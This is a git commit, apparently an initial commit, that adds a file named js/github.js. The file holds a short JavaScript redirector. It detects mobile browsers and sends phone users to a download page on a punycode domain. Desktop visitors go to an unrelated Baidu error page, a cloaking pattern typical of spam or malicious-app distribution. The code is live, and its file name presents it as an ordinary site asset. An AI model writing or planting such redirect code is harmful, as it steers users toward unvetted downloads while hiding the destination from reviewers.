986098e962e5ae607c6f00af38814d200b955cff
18may19 <orsyrthszao@hotmail.com>
2025-03-17 21:25:35 +0800

    Initial commit

---
+++ js/github.js
@@ -0,0 +1,6 @@
+var iphone_url='https://dd12534312.xn--rn3ap6g.com/download/12534312/12534312a8.html';
+var android_url='https://dd12534312.xn--rn3ap6g.com/download/12534312/12534312a8.html';
+var pv_url='https://mbd.baidu.com/newspage/data/error';
+if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {var ua = navigator.userAgent.toLowerCase();  
+if (/iphone|ipad|ipod/.test(ua)) {window.location.href=iphone_url;} else{window.location.href=android_url;}}
+else{window.location.href=pv_url;}
